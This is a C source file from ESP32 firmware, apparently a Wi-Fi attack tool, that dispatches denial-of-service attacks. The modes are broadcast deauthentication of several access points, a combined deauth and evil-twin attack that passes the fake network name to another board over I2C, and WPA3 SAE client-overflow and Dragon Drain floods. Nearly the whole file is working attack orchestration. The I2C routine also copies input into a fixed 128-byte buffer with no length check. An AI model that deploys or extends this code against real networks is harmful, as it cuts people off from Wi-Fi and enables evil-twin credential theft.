/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "driver/i2c.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

#include "global.h"


static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void i2c_master_init() {
    i2c_config_t conf = {
        .mode = I2C_MODE_MASTER,
        .sda_io_num = I2C_MASTER_SDA_IO,
        .scl_io_num = I2C_MASTER_SCL_IO,
        .sda_pullup_en = GPIO_PULLUP_ENABLE,
        .scl_pullup_en = GPIO_PULLUP_ENABLE,
        .master.clk_speed = I2C_MASTER_FREQ_HZ,
    };
    i2c_param_config(I2C_MASTER_NUM, &conf);
    i2c_driver_install(I2C_MASTER_NUM, conf.mode,
                       I2C_MASTER_RX_BUF_DISABLE,
                       I2C_MASTER_TX_BUF_DISABLE, 0);
}

void send_i2c_data(char* name) {
    const char* prefix = "#()^7841%_";
    size_t prefix_len = strlen(prefix);
    size_t name_len = strlen(name);
    size_t total_len = prefix_len + name_len;

    uint8_t data[128];  // Ensure it's large enough
    memcpy(data, prefix, prefix_len);
    memcpy(data + prefix_len, name, name_len);

    i2c_cmd_handle_t cmd = i2c_cmd_link_create();
    i2c_master_start(cmd);
    i2c_master_write_byte(cmd, (I2C_SLAVE_ADDR << 1) | I2C_MASTER_WRITE, true);
    i2c_master_write(cmd, data, total_len, true);
    i2c_master_stop(cmd);
    i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, pdMS_TO_TICKS(1000));
    i2c_cmd_link_delete(cmd);

    vTaskDelay(pdMS_TO_TICKS(200));  // Equivalent to delay(200)
}


void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    ESP_LOGI(TAG, "Attack Method selected: %d", method);
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGI(TAG, "ATTACK_DOS_METHOD_BROADCAST starting for mutiple APs listed below");
            applicationState = DEAUTH;
            for (int i=0; i< attack_config->actualAmount; i++) {
                ESP_LOGI(TAG, "About to invoke ATTACK_DOS_METHOD_BROADCAST 4 SSID: %s", attack_config->ap_records[i].ssid);
                ESP_LOGI(TAG, "Channel is: %d", attack_config->ap_records[i].primary);
            }            
            attack_method_broadcast_multiple_ap(attack_config->ap_records, attack_config->actualAmount, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGE(TAG, "ATTACK_DOS_METHOD_ROGUE_AP DISABLED");
            //TODO fix me attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGI(TAG, "Combine all now supports Deauth+Evil twin.");
            applicationState = DEAUTH_EVIL_TWIN;
            ESP_LOGI(TAG, "ATTACK_DOS_METHOD_BROADCAST starting for mutiple APs listed below");
            for (int i=0; i< attack_config->actualAmount; i++) {
                ESP_LOGI(TAG, "About to invoke ATTACK_DOS_METHOD_BROADCAST 4 SSID: %s", attack_config->ap_records[i].ssid);
                ESP_LOGI(TAG, "Channel is: %d", attack_config->ap_records[i].primary);
            }            
            attack_method_broadcast_multiple_ap(attack_config->ap_records, attack_config->actualAmount, 1);
            
            ESP_LOGI(TAG, "EVIL TWIN starting for one AP: %s", attack_config->evil_ap_name);
            
            evilTwinSSID = strdup(attack_config->evil_ap_name);
            
            i2c_master_init();
            send_i2c_data(attack_config->evil_ap_name);

            //DISABLED attack_method_rogueap(attack_config->ap_record);
            //DISABLED attack_method_broadcast(attack_config->ap_record, 1);
            break;
        case WPA3_SAE_CLIENT_OVERFLOW:
            applicationState = SAE_OVERFLOW;
            wifictl_wpa3_sae_client_overflow(attack_config->ap_records[0]);
            break;
        case WPA3_SAE_DRAGON_DRAIN: 
            applicationState = DRAGON_DRAIN;
            wifictl_wpa3_sae_dragon_drain(attack_config->ap_records[0]);
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}



void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly. Just reset yur board!");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}